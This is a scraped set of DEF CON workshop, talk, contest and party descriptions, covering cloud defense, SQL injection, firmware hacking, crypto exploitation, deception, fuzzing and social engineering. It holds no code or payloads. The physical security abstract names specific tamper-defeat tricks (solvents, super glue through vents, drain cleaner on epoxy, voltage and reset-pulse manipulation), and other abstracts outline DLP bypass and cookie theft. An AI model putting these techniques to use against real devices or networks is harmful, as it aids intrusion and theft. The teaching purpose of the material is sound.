security incidents II – Honeypots” report by ENISA (European Union Agency for Network and Information Security).\n\nMax Class Size: 55\nPrerequisites for students: Setup of VirtualBox for their OS\nMaterials or Equipment students will need to bring to participate: Only their laptops.",

If you work in cloud, or are just cloud-curious, we’ll get you up to speed on the latest and greatest practical techniques for securing Amazon Web Services. We are cutting out all the theory to focus exclusively on the technical implementation.\n\nBefore coming to the session you should know what AWS is and be able to launch and connect to an instance (we’ll provide instructions ahead of time just to be safe). You should also be comfortable with a Linux command line and basic scripting. That’s all you need walking in, but by the time you leave we will have shown you:\n\nHow to build complex AWS virtual networks with cross-account and VPC connectivity.\nHow to leverage auto scale groups for building immutable infrastructure. What’s that? Servers that are impossible to log into and replaced every few hours with 0 downtime.\nTechniques for advanced IAM policies in AWS. For example, using tags or other conditionals for dynamic, fine-grained access.\nBuilding server less infrastructure for automating security. You can, and we sh*t you not, create actual self-healing infrastructure in AWS without any running servers.\nAutomation techniques to play with the AWS APIs like a boss. Sure, we’ll focus on the defensive side, but let’s just say you offensive types might pick up a thing or two.\nHow to build an automated deployment pipeline using Git, Jenkins, Packer, and Ansible to push new images to AWS. (We’ll use a scripted build for time, but you’ll see how it all pieces together).\nIf we have time, we’ll show you how t use Amazon’s Key Management Service to encrypt… everything. Plus cover how to make things subpoena proof, if you are into that sort of thing.\nThe focus of the workshop is on defense, and how to best use the tools in AWS for security. We can’t cover anything in four hours, so we will focus on the technical techniques you can use to most-quickly build up your skills. \n\nRich has twenty years experience in information security, physical security, and risk management.

When an attacker is able to find and exploit such a vulnerability, the end result is often disastrous: complete database downloaded, application backdoor created or even remote code execution. Suffice to say that penetration testers need to find these vulnerabilities before the bad guys do.\n\nBut vulnerability scanners and automated exploitation tools like sqlmap can only do so much when it comes to finding and exploiting SQLi vulnerabilities. While they do a good job for regular or error-based SQLi vulnerabilities, their success rate lowers drastically when blind SQLi is encountered, especially when time-based attacks are required. And if you need to be quiet on the network, most tools are just insanely noisy…\n\nThis course is designed to help penetration testers who have been using these tools to get to the next level, where finding and exploiting SQLi is no longer easy. When only a browser and notepad are available to you or when being quiet is critical, you will be glad you know this stuff.\n\nSQL crash course for hackers (15 min)\nError-based SQL Injection (1h 15min)\nBypassing login (demo)\nUNION exploitation techniques (exercise)\nBlind SQL Injection (2h 30min)\nSplitting and Balancing\nBoolean exploitation techniques (exercise)\nTime-based exploitation techniques (exercise)\nBonus exercise: Exploiting error-based SQLi and blind SQLi using sqlmap\n\nDavid Caissy, M.

Can you create a program that can take any arbitrary program as an input and certify it as free from such errors or alert you of possible avenues of errors? Is such a thing even possible? Turns out, yes you can, or at least after this training you will be able to.\n\nRecent advances in the field of formal program analysis have led to development of theories and tools that can, given a program as input, either guarantee absence of certain types of errors or raise alarms to alert of possible weaknesses in the given program. Sounds like black magic? The goal of this training is to de-mystify the science behind automated program analysis and build a solid foundation for attendees to start building their own tools that can automatically analyze and certify code correctness.\n\nThe workshop will cover the challenges in automated program analysis, what is possible and what is not possible, and why. We will focus on using Abstract Interpretation, a widely used formal framework, for describing sound by construction program analysis algorithms as approximations of semantics of the language. Finally, in the hands-on session, we will build our own code analyzer for a simple language that can analyze any program written in that language and issue certificates of correctness.\n\nVivek Notani is a PhD student at University of Verona, under Dr. Roberto Giacobazzi. Previously, Vivek used to work as a research scholar at University of Louisiana at Lafayette (USA) focusing on dynamic methods of malware analysis and machine learning applications to malware analysis and reverse engineering. His research at UL Lafayette led to the creation of Virusbattle, an automated malware analysis system that harvests intelligence from large malware repositories which was presented at BlackHat last year. VirusBattle has since been commercialized by Cythereal LLC. USA. Early on in his career, Vivek used to work in humanoid robotics and helped create Acyut, series of India's first indigenously developed humanoid robot which created a world record in humanoid weightlifting at FIRA-2010.\n\nRoberto Giacobazzi is a senior professor of computer science at University of Verona and the Scientific Leader of the SPY-Lab. He received his Ph.D. in Computer Science in 1993 from the University of Pisa. From 1993 to 1995 he had a Post Doctoral Research position at Laboratoire d'Informatique (LIX), Ecole Polytechnique (Paris) in the equipe Cousot, the creator of the theory of Abstract Interpretation. His research interests include abstract interpretation, static program analysis, semantics of programming languages, program verification, abstract model-checking, program transformation and optimization, digital asset protection, code obfuscation, software watermarking and lattice theory. He is author of more than 100 publications in international journals and conferences and he is involved in national (italian) and international (european) research projects in the field of static program analysis. His main current research interest is in formal methods for systematic design of domains and transfer functions or abstract interpretation, with application in security, digital asset protection, code obfuscation, watermarking, malware analysis, semantics, program analysis, and abstract model-checking. In the past, he gave a declarative semantics for Prolog control features and he studied new methodologies to design static program analyzers and optimization techniques for logic and constraint-based languages by abstract interpretation. In lattice theory he contributed to understanding of the structure of the lattice of closure operators and complete congruence relations on complete lattices. He is in the Steering Committee of the Static Analysis Symposium and of the ACM Conference on Principles of Programming Languages, POPL.

One of the main waves in cyber security promising to enable that ability is cyber deception, a field that has garnered much attention and investments in the last couple of years. Based on the same concepts as honeypots, but on a different technology, cyber deception promises to create decoys and other assets to make attackers expose themselves and allow it's users to not only detect them, but collect forensics that can be used for immediate mitigation.\n\nDuring this workshop, attendees will learn about MazeRunner, Cymmetria's cyber deception solution which is being released for the first time as the first cyber deception free general use tool. Along with it they will be able to set up deception across environments that will be composed of decoys - real virtual machines that can be linux/windows systems. Configure these machines with different network protocols and content to make them look like anything to deceive a hacker, and lastly creating the connections and credentials to these configurations to deploy to the endpoints, thereby creating a complete layer of deception to lead an attacker. Next we will show how to use the alerts and forensics gathered in order to enable automatic mitigation of threats and enrich your threat intel efforts.\n\nDean Sysman is CTO and co-founder of Cymmetria, an Israeli cyber deception start-up. A unit 8200 veteran, Dean started his military intelligence career first as a low-level security researcher, later on promoted to the rank of Captain to lead high level security research, earning multiple awards for his service. Already when he was 15, he won first place in the prestigious Robotics Olympiad, and by the age of 19 earned his B.Sc. in computer sciences. Before joining Cymmetria, Dean was involved in the development of cross platform translation compiler for embedded processors.\n\nMax Class Size: 55\nPrerequisites for students: None\nMaterials or Equipment students will need to bring to participate: Laptop with these software requirements: web browser, Metasploit framework is optional.\n\n",

In the world of IoT, the hardened system is rare and most times a firmware image is more than enough to find and exploit weakness. This session explains in detail a process for going from zero-knowledge to zero-day on real-world devices without breaking a sweat. Attendees to this tutorial session will learn the ropes of firmware dissection, app decompilation, and manual fuzz testing in a hands-on hack lab. Participants will be provided with a customized Kali Linux virtual appliance and given access to several consumer devices for analysis. These techniques have been successfully employed by the author to identify over 100 CVEs on embedded/IoT devices as well as to win the 0-day and CTF tracks in the DEF CON 22 SOHOpelessly Broken router hacking competition.\n\nCraig Young is a computer security researcher with Tripwire's Vulnerability and Exposures Research Team (VERT). He has identified and responsibly disclosed dozens of vulnerabilities in products from Google, Amazon, IBM, NETGEAR, Adobe, HP, Apple, and others.

They will have a better understanding on the electronics-programming relationship and how these questions can impact on the kernel development. Aside they`ll get a deep knowledge in the kernel basic functions (processes scheduling, i/o drivers controller etc).\n\nRodrigo is a professor at Federal University of Itajubá. He has 9 years working with embedded systems, developing projects both in home and electro-medical appliances. He actually teaches classes on electronics, microcontrollerers and embedded operational systems to electronic engineering students. His researches include topics on hardware development, RTOS security and embedded systems usability. Rodrigo has presented on DEF CON, ESC and BSides conferences, mostly talking about embedded development and related security issues.\n\nMax Class Size: 40 Prerequisites for students:Basic/Intermediate C programming knowledge Materials or Equipment students will need to bring to participate: Just laptops. The electronic material will be provided by me to everyone.",

			"description": "Guaranteed Security\nVivek Notani PhD Student University of Verona\n\nDr. Roberto Giacobazzi Senior Professor, University of Verona\n\nCan you guarantee that the software you created does not contain any runtime errors or data races and would not be susceptible to buffer overflow or floating point errors? Can you create a program that can take any arbitrary program as an input and certify it as free from such errors or alert you of possible avenues of errors? Is such a thing even possible? Turns out, yes you can, or at least after this training you will be able to.\n\nRecent advances in the field of formal program analysis have led to development of theories and tools that can, given a program as input, either guarantee absence of certain types of errors or raise alarms to alert of possible weaknesses in the given program. Sounds like black magic? The goal of this training is to de-mystify the science behind automated program analysis and build a solid foundation for attendees to start building their own tools that can automatically analyze and certify code correctness.\n\nThe workshop will cover the challenges in automated program analysis, what is possible and what is not possible, and why. We will focus on using Abstract Interpretation, a widely used formal framework, for describing sound by construction program analysis algorithms as approximations of semantics of the language. Finally, in the hands-on session, we will build our own code analyzer for a simple language that can analyze any program written in that language and issue certificates of correctness.\n\nVivek Notani is a PhD student at University of Verona, under Dr. Roberto Giacobazzi. Previously, Vivek used to work as a research scholar at University of Louisiana at Lafayette (USA) focusing on dynamic methods of malware analysis and machine learning applications to malware analysis and reverse engineering. His research at UL Lafayette led to the creation of Virusbattle, an automated malware analysis system that harvests intelligence from large malware repositories which was presented at BlackHat last year. VirusBattle has since been commercialized by Cythereal LLC. USA. Early on in his career, Vivek used to work in humanoid robotics and helped create Acyut, series of India's first indigenously developed humanoid robot which created a world record in humanoid weightlifting at FIRA-2010.\n\nRoberto Giacobazzi is a senior professor of computer science at University of Verona and the Scientific Leader of the SPY-Lab. He received his Ph.D. in Computer Science in 1993 from the University of Pisa. From 1993 to 1995 he had a Post Doctoral Research position at Laboratoire d'Informatique (LIX), Ecole Polytechnique (Paris) in the equipe Cousot, the creator of the theory of Abstract Interpretation. His research interests include abstract interpretation, static program analysis, semantics of programming languages, program verification, abstract model-checking, program transformation and optimization, digital asset protection, code obfuscation, software watermarking and lattice theory. He is author of more than 100 publications in international journals and conferences and he is involved in national (italian) and international (european) research projects in the field of static program analysis. His main current research interest is in formal methods for systematic design of domains and transfer functions or abstract interpretation, with application in security, digital asset protection, code obfuscation, watermarking, malware analysis, semantics, program analysis, and abstract model-checking. In the past, he gave a declarative semantics for Prolog control features and he studied new methodologies to design static program analyzers and optimization techniques for logic and constraint-based languages by abstract interpretation. In lattice theory he contributed to understanding of the structure of the lattice of closure operators and complete congruence relations on complete lattices. He is in the Steering Committee of the Static Analysis Symposium and of the ACM Conference on Principles of Programming Languages, POPL. Dr. Giacobazzi's research in abstract interpretation led to the creation of Julia in 2006, which has since been acquired by the Corvallis Group,a leading firm in software development and assurance in the banking market.\n\nMax Class Size: 55\nPrerequisites for students:\n\nProgramming background in C++\nUnderstanding of Software development and testing methods\nBasic understanding of these theories will be helpful but is not required: static analysis, dynamic analysis, lattice theory, FixPoint Theory and, abstract interpretation.\nMaterials or Equipment students will need to bring to participate: Laptop with Linux. Instructors will be using Ubuntu.\nPlease install IKOS library.

In this course, instead of taking the regular flaws in crypto-implementations or popular attacks from past, we will take a holistic approach. Build strong understanding of the crypto-subsystems, their inherent security issues and how to discover, exploit and remediate them all in Flat-4-Hours.\n\nThis workshop takes the participants to next level of practical crypto-assessment and exploitation. With deeper understanding of crypto-systems, plenty of hands on vulnerability assessments and exploitation using Openssl and Open source tools and my custom scripts, participants will learn the important concepts which they can apply in real world RedTeam Pentesting or BlueTeam Defending, assessments & audits of crypto implementations.\n\nThe workshop starts with a dive into the crypto systems present on participant’s own (virtual) machine. Taking a bottom up approach, we start form of Hardware Modules, Firmware, Crypto-Libraries, Network services & we will go all the way up to applications, trust/key stores, understanding the role of each layer in cryptography, test for quality + vulnerabilities and exploit them.\n\nSome of the unique modules covered in the workshop are testing the quality of numbers generated from RNGs & PRNGs from various sources, Extracting prime numbers from the Private keys, DH parameters, Secrete keys and testing for backdoors (Number Fixation), quality of randomness, Safety parameters (like Sofie German Test). And as we go upwards we will search and steal the insecure keys for network hopping like APT/malwares, pin rogue certificates, bypass HSTS checks to steal cookies, exploit certificate switching, Look for Seeds used in PRNG functions, re-usage of keys and flaws in SCEP implementations. And we top it up with the popular named Attacks from HEARTBLEED to LOGJAM and other popular CVEs.\n\nI will be sharing numerous scripts written by me and open source tools which participants can use to test or automate the assessment of their own crypto-systems.\n\nWorkshop is best suited for pen-testers, developers, security engineers, auditors, compliance consultants in general but a must for those who deal with products or services involving cryptography and PKI implementations. The contents + flow of the workshop is well structured to accommodate participants from beginner to advanced level of competence.\n\nAjit is a founder of \"SECURITY MONX\" & author of LAMMA project, an Open Source Initiative to - improve security of Crypto Implementations & - better consume Cyber Threat Intelligence, which also is his primary area of research.\n\nCurrently Ajit is Principle consultant (Cryptography & System Security) with Payatu Technologies. He has worked as a Security Researcher with Symantec, Emerson, IBM, Bluelane Technologies in past & has presented his research at BlackHat, Defcon-CnPV & Nullcon.\n\nAjit is also a co-founder of \"null Open Security Community\", a hardcore volunteer and contributor through the community efforts of Null, Nullcon, SecurityTube.net & BSidesLV.

			"description": "Physical Security for Computing Systems, a Look at Design, Attacks and Defenses\nSteve Weingart Security Researcher\n\nPhysical security for computing systems is a topic that usually gets left to FIPS 140 and tamper labels, but it is a much broader and more interesting subject. As the value of data on computing systems increases and operating systems become more secure, physical attacks on computing systems to steal or modify assets become more likely. At the low end are locks and tamper labels, at the high end are complex mechanisms to detect and respond to tampering and intrusion from the box level all the way down to the chip level. All of this technology requires constant review and improvement, just as other competitive technologies need review to stay at the leading edge. The bar is ever rising.\n\nPhysical security is an interdisciplinary field. The materials and chemistry are as important as the electronics, circuits and physics. A tamper label can be defeated by application of the right solvent. A cover switch can be defeated by piping super glue in through an air vent or a slightly bent cover. Hard epoxies can be removed with drain cleaner and a tamper detection circuit can be defeated by setting the supply voltage to a critical value or a microprocessor's start up tests bypassed by manipulating the width of the reset pulse.\n\nThis training session will show many of the known attack and defense methods from the basic to the exotic. It will include easy and low tech ways of performing high tech attacks, as well as descriptions of the highest tech methods.\n\nDesign examples will be shown with examples of the tools, devices, circuits and materials used to implement both attack and defense systems. Demonstrations will be included.\n\nSteve Weingart has been active in the Security Standards and Physical Security communities since the 1980's. He was on the NIST panel that wrote FIPS 140-1 and has been a continuing contributor to both FIPS 140 and Common Criteria development. At the IBM Thomas J. Watson Research Center, he was the lead engineer for the IBM 4758 secure coprocessor which was the first cryptographic module validated at Security Level 4 under FIPS 140-1. He has continued to work in the security field as a developer of secure cryptographic modules, a consultant, a standards test lab engineer and as a standards test lab manager. Steve now coordinates security standard certifications for Aruba and continues to consult, contribute to the standards community and trains others in security standards and physical security.\n\nMax Class Size: 55\nPrerequisites for students: Some knowledge of analog and digital electronic circuits would be very helpful. Knowledge of materials and some chemistry is handy too.\nMaterials or Equipment students will need to bring to participate: None, I will supply any needed.",

Breaches are often detected months after the attack. Due to the ephemeral nature of malicious DNS domains, existing well-known passive DNS collections lack complete visibility to aid in conducting incident response and malware forensics. We will present a new tool to collect local passive DNS data, which will enable security operations capabilities to conduct more effective defense against malware, including APTs, zero days, and targeted attacks. Our presentation will consist of a demo of the tool, and the tool will be released for public use.\n\nKathy Wang (Twitter: @wangkathy) Kathy Wang is an internationally-recognized malware expert, who has researched, developed, evaluated, and operationalized various solutions for detecting and preventing client-side attacks used by advanced persistent threats (APT), as they target common platforms (e.g., browser, email, mobile phones). Prior to Splunk, Kathy has held past positions such as Director of Research and Development at ManTech International, and Principal Investigator of the Honeyclient Project at The MITRE Corporation, during which she pioneered a prototype that became the basis of current cutting-edge zero-day malware detection technologies. Kathy has spoken at many security conferences and panels internationally, including RSA, DEF CON, AusCERT, and REcon. She has co-authored a book, Beautiful Security, and holds a BS and MS in Electrical Engineering from The University of Michigan, Ann Arbor.\n\n",

The hunters, cloaked in anonymity, strike without warning, devouring Intellectual Property and destroying corporate reputations. Potential victims cower in Fear, Uncertainty and Doubt, hoping they can hide in plain view. But can we learn from the hunters strategies to mount an effective defense? In this talk we'll take a look at events that took place on the James Bond film Skyfall.

Fuzzers are an incredibly useful offensive tool, and equally critical for a defensive player. But anyone who has tried to use these big-name fuzzers to secure their own software has seen how ineffective they can be. The fuzzing world is plagued with over-hyped and under-developed fuzzers that will suck the life out of anyone who dares try to sort through their waterlogged codebase. Meanwhile, commercial players stand by ready to support big businesses, but not open source. Commercial fuzzers may be good business, and their existence is a boon for the industry, but they are not sufficient for widespread security. They keep the power of fuzzing locked up for those willing to pay big bucks. And the closed source nature stamps out community, leaving each business to develop their own practices. In this talk, Joshua will provide a practical perspective on fuzzing, explore the hurdles confronting current open source tools and pave a path forward. Attendees will also receive an introduction to DIY fuzzers using modern frameworks.\n\nJoshua Pereyda (Twitter: @jtpereyda) is a software engineer specializing in information and network security. He currently works in the critical infrastructure industry with employers heavily invested in software and hardware security. Among his passions are hacking, teaching kids to program, Netflix with his wife, and figuring out how he can get paid to do it all --legally.\n\nJoshua is the maintainer of boofuzz, a fork of the renowned Sulley fuzzing framework.

But with the explosion of public exploits, polymorphic malware and an ever-increasing attack surface, how can IPS devices keep up? They all seem to have heuristic detection capabilities, which are supposed to protect you from unknown exploits, and frequent updates to protect against known vulnerabilities. But just how effective are those defenses? Sure, you can check out the Gartner magic quadrant or pay for the latest NSS Test report. Just because an IPS claims to protect you from a vulnerability doesn'tmean thats the case. In this talk, I'll talk about some of the strengths and weakness of IPS devices, as well entire classes of exploits that cause serious problems for IPS devices. While I happen to work for a company sells a very expensive device for testing IPS devices (which is where the data and my opinions come from), I plan to focus on how the same testing methodologies can be applied and the results can be duplicated using open-source tools.\n\nGarett Montgomery (Twitter: @garett_monty) is Security Team Lead at Ixia's ATI Research Center, where the primary focus is on simulating attacker behaviors in order to provide realistic test scenarios for network-based protection devices. He has been simulating network-based attacks for BreakingPoint/Ixia for the last 4 years. Prior to joining BreakingPoint in 2012 he spent 2 years as a Research Engineer at TippingPoint/HP Enterprise Security. Before TippingPoint, he spent 9 years in the Navy, with last 3+ as a Security Analyst for the Naval Postgraduate School in Monterey, CA. He holds a Masters Degree in Information Assurance, as well as an active CISSP certifications (multiple others having long since lapsed).",

This changes the face of web scraping dramatically, as simply wget'ing and parsing the response from a URL becomes useless without executing bulky JavaScript with third party plugins, reading through code logic manually, and/or digging through piles of browser junk.\n\nHowever, moving page logic client side can also create data vulnerabilities, as companies leave internal APIs exposed to the world, in order for their client side code to make use of them. I'll show some examples of this practice on traditionally \"impossible to scrape\" pages, and also some tools I've developed to crawl domains and discover and document these hidden APIs in an automated way. While many bot prevention measures focus on traditional page scraping and site manipulation, scripts that crawl sites through API calls, rather than in a \"human like\" way through URLs, may present unique security challenges that modern web development practices do not sufficiently address.\n\nRyan Mitchell (Twitter: @kludgist)",

Entertainment includes:\n\nOUR FEATURED PERFORMER: \n\nPictureplane\n\nTravis Egedy, a.k.a. Pictureplane, made his name chasing unpopular realities and alternate truths across various media. His gallery works, shown on both sides of the pond, collide familiar with fringe. His Alien Body clothing line offers a stylized study of symbology, the occult, and societal decay. And his music – blissed yet shadowy, swirling up vintage strains of house, hip-hop, and noise – treats electronics not as uncannily artificial, but as extensions of our more magical selves. One could, if one was open to such things, visualize the Brooklyn-based artist’s albums and their wild live performances as pathways to a rarer form of realness. Because while the Good Show tells us to “Trust No One,” exceptions are granted to men with X-Files tattoos.\n\nEgedy came into his own while in Denver, Colorado. He had been pursuing a BFA in painting at Rocky Mountain College of Art + Design, but his day-to-day existence had become the medium. He lived in the legendary Rhinoceropolis warehouse, and helped convert that junkyard-adjacent DIY venue into the hub for the city’s expanding art-punk underground. In that space, his music evolved fast, and Pictureplane was born into a dank stew of harsh sounds, sub-standard living, outsider art, scavenged furnishings, weird smells, and magnificent openness. By the time his remix of HEALTH’s “Lost Time” hit the blogosphere, Egedy had grown into a sound: raw, moody dance-pop addled by rap rhythms and augmented by airy vocals. In 2009, he dropped his official debut, Dark Rift, on Lovepump United, along with a song whose title spoke volumes: “Goth Star.” By the year’s end, in a stroke of tongue-in-cheek genius, he coined the term “witch house” to describe the upwelling of dark EDM owing nearly equally to legacies of Psychic TV and C+C Music Factory.\n\nIn 2011, Pictureplane’s Thee Physical arrived, marking a major leap forward both sonically – Egedy’s voice dripping sex at the forefront of an emotive technoscape – and thematically: tracks like “Trancegender” and “Breath Work” explore sensuality and the human body with gender-dissolving aplomb. Egedy moved to Brooklyn in 2012 in order to stoke alt-rave culture from a more powerful vantage. He has since toured with Crystal Castles and Major Lazer, headlined independent fests in Europe, remixed the likes of Lil B, been remixed by Grimes, made beats for Antwon and Sole, and churned out a stream of self-releases (I.E. Thee Negative Slave Mixtape). In 2015, Pictureplane teams with Anticon to release his long-awaited next LP.\n\nWITH SPECIAL GUESTS:\n\nMiss DJ Jackalope\n\nA DEF CON favorite and 303’s own Miss Jackalope has been playing Drum and Bass and Breaks since 1996. If you’ve been to con before, you’ve definitely seen her spinning at the EFF Summit, the Black balls, various pool parties, or selling CDs at her booth in the vendor room. Or, well, maybe you’ve just seen her causing ruckus with her Army and making everyone have a good time!\n\nAND SPECIAL HARD DANCE SETS FROM:\n\nDJ Ritual\nDJ Slave 1",

It’s not difficult at all to learn, especially if you understand a little about assembly language programming already. Check out this tutorial to get started.\n\nHill rules are:\n\nICWS I994 extensions enabled\nCore size: 8000 cells\nCycles to completion: 80000 cycles\nMaximum number of processes: 8000 processes\nMaximum warrior length: 100 instructions\nMinimum distance between warriors: 100 cells\nIf you would like to test your warriors with these conditions in pMARS, use the command line settings: pmars -p 8000 -c 80000 -p 8000 -l 100 -d 100\n\nPlease test your warriors on the pMARS before submitting them. Submissions that fail to parse or fail to assert will be rejected.\n\nWe will run two separate competitions, one on Friday and one on Saturday. Several practice rounds will occur each day before the official qualification, semifinals, and finals rounds.\n\n",

Cyber criminals continue to stay on the cutting edge of attack methodologies and have sharply increased their capabilities and techniques, targeting major companies across all industries. Enterprises can no longer wait and react to the next big attack. In order to maintain a top of the line defense against the newest threats to cybersecurity, organizations across all vectors must adopt a more vigilant and agile approach to security in order to combat the new era of threats they now face. We invite you to join Cybereason and Lockheed Martin for an engaging discussion and networking opportunities on how organizations can regain control and transform into elite defenders.\n\nComplimentary Transportation\n\nCybereason, Lockheed Martin and T.E.N. will be providing continuous complimentary shuttle service between Mandalay Bay and The Cosmopolitan at 20 minute intervals. Shuttle service will start from Mandalay Bay at 6 pm. Meet at Mandalay Bay's Shark Reef, curbside on Russell and Las Vegas Boulevard, for transportation to the Cosmopolitan's main entrance. The last shuttle will depart from The Cosmopolitan’s main entrance at 10pm to return you to Mandalay Bay.\n\nShuttles will be white and branded with the Cybereason and Lockheed Martin logos. T.E.N. Staff will also be on site at both locations to assist you throughout the evening.",

There is no \"top winner,\" everyone who completes various tasks will have a chance to win something from a random drawing, plus some other special prizes for those who go above and beyond.\n\nEntry is $2 to cover the cost of hardware, anything given above that will be handed right to the EFF/Hackers for Charity/you suggest something/etc. That $2 buys you some hardware, and instructions on how to proceed. The hardware can of course be used after the con, it might not be much, but it's one more tool in your box that you can use in a pinch somewhere. Contest start is Friday morning when the contest floor opens; all completed entries must be submitted by Saturday night when the contest floor closes. All winners will be announced Sunday. Instructions with the hardware will have more information on this.\n\nThe HHV will have some equipment set up in order to help play along with this challenge, but it is suggested to bring your own tools if you have them. This is a friendly competition, help out your fellow hackers, learn something new! The skill level required for this is pretty basic, but it does ramp up. Don't let this discourage you! There are two tiers of entries, even if you are just starting out in electronics you can learn something and have a chance to win something.\n\nFYI if this ends up being popular, it will make its way back to the HHV again in coming years.

Despite receiving a degree in psychology, he spent 18 years as a professional in the Information Technology space. James spent the first seven years of his career as a system and network administrator before moving to the dark art of programming. Two years ago he stopped dabbling and tumbled down the security rabbit hole. This journey makes him believe that he is finally using his degree professionally. During his downtime, James can be found practicing martial arts, brewing beer and mead, or writing.\n\nDescription: You are being manipulated. There is constant pressure coming from companies, people, and attackers. Millions are spent researching and studying your weaknesses. The attack vectors are subtle. Most times we don’t realize that manipulation has occurred until it is too late. Fear not, we can harden our defenses. We can put safeguards in place to help avoid being the victim.\n\nFor me, the answer came from an unlikely source: my daughter. Small children are fantastic. Society has not yet influenced their development; therefore, children are relentless in pursuing their aims. Since they are naive to right and wrong, they will use any tool available to get their goal.\n\nHow does this help? My daughter became my trainer, and this talk discusses how interacting with her has improved my defenses. Comparing her strategies to real world examples will show how to build a training framework of your own. Access to small children is not needed.",

Manuals, radical lesbian separatists, and an 18th century Romantic essayist teach you about engineering the world to be a better place? We often think about social engineering either on the small-scale – how can one operate in individual conversations to manipulate others for data, access, or specific, immediate purposes – or we think about engineering on a large scale, how politicians or other popular figures embrace and direct a culture. But what about the mid-range? This non-technical paper briefly addresses the techniques and histories of large and small-scale social engineering in order to address the middle ground. This presentation by someone with years of experience with staff and faculty at a state institution will discuss social-engineering on the job, on committees, and dealing with small, educated and uneducated collectives.\n\nTexts referenced will include, among others, Edward Young’s “Conjectures on Original Composition,” the Valerie Solanas “S.C.U.M.

He loves reading about security and most importantly traveling the world to attend conferences and share his knowledge and learn from others. Not a guru nor an expert, simply a security over-enthusiast.\n\nDescription: In the last couple of years, the number of cases of people being scammed online has risen gradually, and as the number of people become increasingly connected to the online world, so are the number of scammers. Scam cases, from online dating scams, winning lottery scams, free credit card scams, and of course the Nigerian prince who wants to send millions of dollars to your bank account scams are some of those that have been hitting innocent victims the most. Although many such reported cases are published online and on paper, many are still falling victims to such malicious incidents. Recent news by Channel News Asia reported that Singaporeans have been the main target of online scams and GET REAL even published a documentary about the victims of cyber/online scams.\n\nAccording to the Singapore Police Force (SPF), there were 16,575 crime cases recorded in the first six months of 2015, an increase of 6.7 per cent over the same period of 2014. In the latest report by the SPF, a total of 33,608 cases were recorded last year, up from 32,315 cases in 2014. Online commercial crimes rose by 95 per cent to 3,759 cases, up from 1,929 cases in 2014 which made Singapore’s crime up to 4% driven mostly by cybercrime.\n\nThis presentation aims to share and discuss on the growing threat industrial complex driven by cyber crime and specifically cyber scams. We will share our analysis on the countries (Nigeria, China, Philippines, India) involved, how advanced social engineering has helped evolve the techniques and modus operandi used by cyber scammers, the impact it has made in Singapore and why Singapore has been a huge target in South East Asia.",

			"description": "So you think you can code, and want to try out for our crazy little contest. Awesome. Some things you need to know to get started:\n\nWhat is Crash and Compile?\n\nWhat happens when you take an ACM style programming contest, smash it head long into a drinking game, throw in a mix of our most distracting helpers, then shove the resulting chaos incarnate onto a stage? You get the contest known as Crash and Compile.\n\nDo you think you can code? Do you think you can code while drinking? We are looking for nine teams who think they have the smarts, the concentration, and the liver to hold up to our gauntlet of programming. Teams who can not only code, but do so with style. We set you against the clock and the other teams. And because they think watching people simply code is boring, our \"Team Distraction\" is has taken it upon themselves to be creative in hindering you from programming, much to the enjoyment of the audience. \n\nQualifications take place Friday afternoon in the contest area. Teams of one or two people. Be ready to code, as this won't be easy. The top nine teams who showed themselves ostentatious enough to take on our challenge will compete on the Contest Stage Saturday.\n\n\nAs much as it would be great to have more people competing, Crash and Compile only has space for nine teams during the main contest. It's highly competitive, and so we only the best move on to the coveted nine spots. But how do we know you are the best? That's where the qualification round comes in. In years past, this would happen prior to DEF CON. But as you can guess, many people had difficulty finding time to work on this on top of life and all the other things which happen just before DEF CON. To get more involvement, and give everyone a chance to try out Crash and Compile, last year we moved the qualification round to Friday during DEF CON, and this worked awesomely. We had more people try out for Crash and Compile than we had ever had. So we are doing the same this year.\n\n\nKey points:\n\n* Qualifications start on Friday at 12pm in the Contest Area.\n* Teams are up to two people.\n* We encourage you to try out, even if you don't think you could qualify. The problems are fun, and you learn something by doing. DEF CON is all about getting involved.\n* You will need your laptop setup with the development environment of your choice.\n* You can't compete if you can't code. Repeat, you need your laptop. If you worry about getting haxored by the evil defcons, then throw a distro of linux on a new drive, and you will be fine.\n* During the qualification round, use whatever method of getting to the internet as you would like, either via DEF CON's wireless network, your hotel room, cellular modem, AOL dial up, etc..\n* During the contest if you qualify, network access is wired via the DEF CON network. Means you are isolated from the wireless, but you do need a network interface (looking at you Mac users)\n* During qualifications you get two hours to complete the sample problems. Didn't finish, not a big deal, we're looking on how well you did, and what you've submitted. We announce who made it to the main contest later that evening, as well as any alternate teams, should someone have to bail.\n* The contest runs on the main stage in the contest area. It consists of several rounds, as you accumulate points for problems completed, beers drank, and perhaps even style points (awarded for particular badassery)\n\n\nHow problems work:\n\nYou get a problem description, sample input and sample output. You have to write a program that can, based on the problem description, read in the sample input, and output the sample output. Simple right?\n\nInterface to the contest is web based. The program input is generated randomly, and you get five minutes to download the sample input, run it through your program, and then upload the sample output, as well as a copy of your source code. Don't make it in five minutes, you can try again. We do present you with a simple \"Hello World\" test case to make sure you are set before starting the timed portion.\n\n\nWe hope to see you there.",

Attendees will learn techniques to simply and repeatably bypass DLP controls and defeat data whitelisting enforced by Multi Level Security (MLS) devices. You will also learn methods for generating social engineering attacks against SecOps analysts and censors who may review your communications, plus techniques to counter frequency analysis attacks against your cloaked communications. All of this is accomplished using only simple Python scripts and text-based ciphers of your choosing. Attendees will then use the toolset to generate their own custom ciphers and social engineering attacks as we work through scenarios together.\n\nBio:\nTryCatchHCF / Joe Gervais is the Principal InfoSec Engineer & Lead Pentester at LifeLock, and author of the Cloakify exfiltration toolset. He has 25+ years of security- and software engineering experience, mostly in US gov't/DoD sectors, and served as an Intelligence Analyst and Counterintelligence Specialist in the United States Marine Corps.

Why It's Gone and Never Coming Back\n\nSpeaker Name, Employer or position:\nRichard Thieme (Neuralcowboy) - ThiemeWorks\n\nAbstract: \n“Get over it!” as Scott McNeeley said years ago about the end of privacy as we knew it is not the best advice. Only by understanding why it is gone and never coming back can we have a shot at rethinking what privacy means in the context of our evolving humanity.\nRichard Thieme provides a historical and social context for some of that rethinking. He goes both deep and wide and challenges contemporary discussions of privacy to get real and stop using a 20th century framework.\nOur technologies have changed everything, including us. We humans are loosely bounded systems of energy and information. We interact with other similar systems, both organic and inorganic, \"natural\" and \"artificial.\" These “differently sentient systems” all consist of nodes in intersecting networks extending in several dimensions. We have always known we were like cells in a body, but we emphasized “cell-ness.” Now we have to emphasize “body-ness” and re-imagine who we have become.\nWhat we see depends on the level of abstraction at which we choose to look. Patterns extracted from data are either meta-data or just more data, depending on the level of scrutiny. The boundaries we like to imagine around our identities, our psyches, our \"private internal spaces,\" are violated in both directions, in and out, by symbolic data that, when aggregated, constitutes “us.” It's like orange juice, broken down into different states before recombination as new juice; it is reconstituted by others but still 